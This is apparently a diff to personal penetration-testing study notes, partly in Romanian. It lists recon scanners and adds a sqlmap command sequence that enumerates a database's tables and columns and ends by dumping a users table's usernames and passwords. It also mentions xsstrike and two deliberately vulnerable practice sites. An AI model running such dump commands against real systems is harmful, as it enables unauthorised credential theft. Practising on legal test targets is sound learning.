@@ -10,6 +10,17 @@ nmap -O - Server's OS Detector
 nuclei - scanner
 nuclei -severity - For Different Levels of Severity
 waybackurls - Reconaissance for past tools, third-party searching from an archive
+tidos
+
+---------------------------------------------------------------------------
+sqlmap cu --dbs ptr a scoate bazele de date, dupa ce scoatem bazele de date scriem
+for example sqlmap -u url-ul -D acuart(ce am scos) --tables ptr a scoate tabelele
+-T users --columns
 
 
-
+sqlmap -u url -D acuart -T users -C uname,pass --dump
+-----------------------------------------------------------------------------
+xsstrike with and without --crawl
+----------------------------------------------------------------------------
+http://testfire.net/
+http://testphp.vulnweb.com/
